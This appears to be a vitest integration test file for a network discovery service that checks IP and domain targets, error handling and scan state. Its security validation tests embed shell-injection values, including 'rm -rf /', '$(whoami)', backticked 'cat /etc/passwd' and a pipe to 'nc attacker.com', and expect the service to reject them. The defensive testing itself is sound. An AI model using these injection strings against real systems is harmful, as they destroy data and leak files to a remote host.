import { describe, it, expect } from 'vitest';

/**
 * Local Integration Tests for Discovery Service
 *
 * These tests call the actual running Restate server (localhost:8080)
 *
 * Prerequisites:
 * 1. Restate server running: npx @restatedev/restate-server
 * 2. Worker running: pnpm dev
 * 3. Worker registered: curl -X POST http://localhost:9070/deployments -d '{"uri":"http://localhost:9080"}'
 */

const RESTATE_URL = 'http://localhost:8080';

async function callDiscovery(input: any): Promise<any> {
  const response = await fetch(`${RESTATE_URL}/Discovery/discover`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(input),
  });
  return response.json();
}

async function getState(scanId: string): Promise<any> {
  const response = await fetch(`${RESTATE_URL}/Discovery/getState`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ scanId }),
  });
  return response.json();
}

describe('Discovery Service - Local Integration', () => {
  describe('IP Target Discovery', () => {
    it('should discover IP targets directly', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'IP', value: '192.168.1.1', scope: 'INTERNAL' },
          { type: 'IP', value: '10.0.0.1', scope: 'INTERNAL' },
        ],
      });

      expect(result.scanId).toBeDefined();
      expect(result.devices).toHaveLength(2);
      expect(result.devices[0]).toMatchObject({
        scope: 'INTERNAL',
        ipAddress: '192.168.1.1',
        discoveryMethod: 'direct',
        confidence: 1,
      });
      expect(result.totalTargetsProcessed).toBe(2);
      expect(result.errors).toEqual([]);
    });

    it('should handle mixed scopes', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'IP', value: '8.8.8.8', scope: 'EXTERNAL' },
          { type: 'IP', value: '192.168.1.1', scope: 'INTERNAL' },
        ],
      });

      const scopes = result.devices.map((d: any) => d.scope);
      expect(scopes).toContain('EXTERNAL');
      expect(scopes).toContain('INTERNAL');
    });
  });

  describe('Security Validation', () => {
    it('should block shell metacharacters in domain', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'DOMAIN', value: 'example.com; rm -rf /', scope: 'EXTERNAL' },
        ],
      });

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain('shell metacharacter');
      expect(result.errors[0]).toContain(';');
      expect(result.devices).toEqual([]);
    });

    it('should block command substitution attempts', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'DOMAIN', value: 'bad$(whoami).com', scope: 'EXTERNAL' },
        ],
      });

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain('shell metacharacter');
      expect(result.errors[0]).toContain('$');
    });

    it('should block backtick command substitution', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'DOMAIN', value: 'bad`cat /etc/passwd`.com', scope: 'EXTERNAL' },
        ],
      });

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain('shell metacharacter');
    });

    it('should block pipe attempts', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'DOMAIN', value: 'example.com | nc attacker.com', scope: 'EXTERNAL' },
        ],
      });

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain('shell metacharacter');
    });
  });

  describe('Error Handling', () => {
    it('should continue with valid targets when some fail', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'DOMAIN', value: 'invalid;domain', scope: 'EXTERNAL' },
          { type: 'IP', value: '192.168.1.1', scope: 'INTERNAL' },
          { type: 'IP', value: '10.0.0.1', scope: 'INTERNAL' },
        ],
      });

      expect(result.errors).toHaveLength(1);
      expect(result.devices).toHaveLength(2);
      expect(result.totalTargetsProcessed).toBe(2);
    });

    it('should reject empty targets array', async () => {
      const result = await callDiscovery({
        targets: [],
      });

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toContain('No targets provided');
      expect(result.devices).toEqual([]);
      expect(result.totalTargetsProcessed).toBe(0);
    });

    it('should validate IP format', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'IP', value: '999.999.999.999', scope: 'EXTERNAL' },
        ],
      });

      expect(result.errors).toHaveLength(1);
      expect(result.errors[0]).toMatch(/invalid.*ip/i);
    });
  });

  describe('State Queries', () => {
    it('should provide state after discovery completes', async () => {
      const discoveryResult = await callDiscovery({
        targets: [
          { type: 'IP', value: '192.168.1.100', scope: 'INTERNAL' },
        ],
      });

      const state = await getState(discoveryResult.scanId);

      expect(state).toMatchObject({
        phase: 'COMPLETED',
        totalTargets: 1,
        processedTargets: 1,
        devicesFound: 1,
        errors: [],
      });
      expect(state.startedAt).toBeDefined();
      expect(state.completedAt).toBeDefined();
    });

    it('should return error for non-existent scanId', async () => {
      const state = await getState('non-existent-scan-id');

      expect(state).toHaveProperty('error');
      expect((state as any).error).toContain('No state found');
    });
  });

  describe('Performance Metrics', () => {
    it('should include performance metrics', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'IP', value: '192.168.1.1', scope: 'INTERNAL' },
        ],
      });

      expect(result.performance).toBeDefined();
      expect(result.performance.executionTimeMs).toBeGreaterThan(0);
      expect(result.performance.devicesPerSecond).toBeGreaterThan(0);
    });

    it('should calculate devices per second correctly', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'IP', value: '192.168.1.1', scope: 'INTERNAL' },
          { type: 'IP', value: '192.168.1.2', scope: 'INTERNAL' },
        ],
      });

      const { executionTimeMs, devicesPerSecond } = result.performance;
      const calculatedRate = (result.devices.length / executionTimeMs) * 1000;

      // Should be close (within 10% due to rounding)
      expect(Math.abs(devicesPerSecond - calculatedRate) / calculatedRate).toBeLessThan(0.1);
    });
  });

  describe('Custom Scan ID', () => {
    it('should use custom scanId if provided', async () => {
      const customId = 'my-test-scan-' + Date.now();

      const result = await callDiscovery({
        scanId: customId,
        targets: [
          { type: 'IP', value: '192.168.1.1', scope: 'INTERNAL' },
        ],
      });

      expect(result.scanId).toBe(customId);
    });

    it('should generate scanId if not provided', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'IP', value: '192.168.1.1', scope: 'INTERNAL' },
        ],
      });

      expect(result.scanId).toBeDefined();
      expect(typeof result.scanId).toBe('string');
      expect(result.scanId.length).toBeGreaterThan(0);
    });
  });

  describe('Domain Discovery (with tools)', () => {
    it('should gracefully handle missing tools', async () => {
      const result = await callDiscovery({
        targets: [
          { type: 'DOMAIN', value: 'example.com', scope: 'EXTERNAL' },
        ],
        tools: ['subfinder'],
      });

      // Tool not installed, should have error but complete gracefully
      expect(result.scanId).toBeDefined();
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors[0]).toContain('subfinder');
    });
  });
});
